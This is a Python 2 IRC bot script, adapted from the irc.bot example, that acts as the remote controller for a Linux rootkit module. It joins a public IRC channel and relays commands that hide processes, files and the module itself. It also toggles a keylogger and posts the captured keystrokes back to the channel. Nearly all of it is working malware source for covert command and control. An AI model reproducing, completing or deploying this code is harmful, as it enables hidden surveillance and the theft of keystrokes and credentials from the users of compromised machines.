#!/usr/bin/env python
#
# Example program using irc.bot.
#
# Joel Rosdahl <joel@rosdahl.net>

"""A simple example bot.

This is an example bot that uses the SingleServerIRCBot class from
irc.bot.  The bot enters a channel and listens for commands in
private messages and channel traffic.  Commands in channel messages
are given by prefixing the text by the bot name followed by a colon.
It also responds to DCC CHAT invitations and echos data sent in such
sessions.

Bot commands are:

    BOT COMMANDS --------
    stats -- Print some channel information.
    disconnect -- Disconnect the bot. The bot will try to reconnect
                  after 60 seconds.
    die -- Kill the bot.
    -------dcc -- Command a bot DCC CHAT invite connection.

    ROOT COMMANDS -------

    hpXXXX -- Hide a process id.
    sp -- Show the last hidden process.
    tls -- Toggle keylogger on/off. 
    thf -- Toggle files show/hide.
    mh -- Hide the root module. 
    ms -- Show the root module.
"""
import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
import key


server = "chat.freenode.net"
port = 6667
channel = "#rwx-hack"
nickname = "rwx-lkm"

# Debug Mode -- set to False to remove.
debug = True 

class Bot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port=6667):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname)
        self.channel = channel

    def on_nicknameinuse(self, c, e):
        if debug:
            print "Nickname in use. Modifying to " + c.get_nickname() + "_"
        c.nick(c.get_nickname() + "_")

    def on_welcome(self, c, e):
        if debug:
            print "Joining %s" % self.channel
        c.join(self.channel)

    def on_privmsg(self, c, e):
        self.do_command(e, e.arguments[0])

    def on_pubmsg(self, c, e):
        a = e.arguments[0].split(":", 1)
        if len(a) > 1 and irc.strings.lower(a[0]) == irc.strings.lower(self.connection.get_nickname()):
            self.do_command(e, a[1].strip())
        return

    def on_dccmsg(self, c, e):
        if debug:
            print "You said: " + e.arguments[0]

        c.privmsg("You said: " + e.arguments[0])

    def on_dccchat(self, c, e):
        if len(e.arguments) != 2:
            return
        args = e.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def root_command(self, cmd):
        f = open("botcmdtest.txt", "w")
        # f = open("/proc/colonel", "w")
        f.write(cmd)
        f.close()

    def root_status(self):
        f = open("response.txt", "r")
        # f = open("/proc/colonel", "r")
        s = f.read().split("\n")
        for n in reversed(range(len(s)-1)):
            if "STATUS" in s[n]:
                del s[:n]
                return s
        return

    def keylogs(self):
        # Translate the logs and print to console (option to send DCC)
        log = open('evlog.txt')  # CORRECT PATH
        f = log.read()
        log.close()
        kl = key.translate(f)
        return kl


    def error_log(self):
        # Print error log to console (better to send DCC)
        pass

    def do_command(self, e, cmd):
        nick = e.source.nick
        c = self.connection

        if "disconnect" == cmd:
            if debug:
                print "Disconnecting. Will attempt reconnect in 60 seconds..."

            self.disconnect()
        elif "die" == cmd:
            if debug:
                print "Die"

            self.die()
        elif "stats" == cmd:
            if debug:
                print "Retrieving channel stats."
            
            for chname, chobj in self.channels.items():
                c.notice(chname, "--- Channel statistics ---")
                c.notice(chname, "Channel: " + chname)
                users = chobj.users()
                users.sort()
                c.notice(chname, "Users: " + ", ".join(users))
                opers = chobj.opers()
                opers.sort()
                c.notice(chname, "Opers: " + ", ".join(opers))
                voiced = chobj.voiced()
                voiced.sort()
                c.notice(chname, "Voiced: " + ", ".join(voiced))

            if debug:
                print "--- Channel statistics ---"
                print "Channel: " + chname
                print "Users: " + ", ".join(users)
                print "Opers: " + ", ".join(opers)
                print "Voiced: " + ", ".join(voiced)
        elif "dcc" == cmd:
            dcc = self.dcc_listen()
            c.ctcp("DCC", nick, "CHAT chat %s %d" % (
                ip_quad_to_numstr(dcc.localaddress),
                dcc.localport))

            if debug:
                print "DCC", nick, "CHAT chat %s %d" % (
                ip_quad_to_numstr(dcc.localaddress),
                dcc.localport)
        elif "sp" == cmd or "tls" == cmd or "thf" == cmd or "mh"  == cmd or "ms" == cmd or "hp" in cmd:
            self.root_command(cmd)
            status = self.root_status()
            c.notice(channel, "Command %s executed." % cmd)
            if debug:
                print "Command %s executed." % cmd
            for line in status:
                c.notice(channel, line)
                if debug:
                    print "%s" % line
        elif "keylog" == cmd:
            for k in self.keylogs():
                c.notice(channel, k)
                if debug:
                    print k
        elif "help" == cmd:
            if debug:
                print """
BOT COMMANDS --------
stats -- Print some channel information.
disconnect -- Disconnect the bot. The bot will try to reconnect
              after 60 seconds.
die -- Kill the bot.

ROOT COMMANDS -------
hpXXXX -- Hide a process id.
sp -- Show the last hidden process.
tls -- Toggle keylogger on/off. 
thf -- Toggle files show/hide.
mh -- Hide the root module (default). 
ms -- Show the root module.
"""

            c.notice(channel, "BOT COMMANDS --------")
            c.notice(channel, "stats -- Print some channel information.")
            c.notice(channel, "disconnect -- Disconnect the bot. The bot will try to reconnect after 60 seconds.")
            c.notice(channel, "die -- Kill the bot.")
            c.notice(channel, "ROOT COMMANDS -------")
            c.notice(channel, "hpXXXX -- Hide a process id.")
            c.notice(channel, "sp -- Show the last hidden process.")
            c.notice(channel, "tls -- Toggle keylogger on/off (default is off).")
            c.notice(channel, "thf -- Toggle files show/hide  (default is hide).")
            c.notice(channel, "mh -- Hide the root module (default).")
            c.notice(channel, "ms -- Show the root module.")
        else:
            if debug:
                print nick, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
           
            c.notice(channel, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname))

def main():
    bot = Bot(channel, nickname, server, port)

    if debug:
        print "Connecting to %s on port: %d" % (server, port)
    bot.start()

if __name__ == "__main__":
    main()
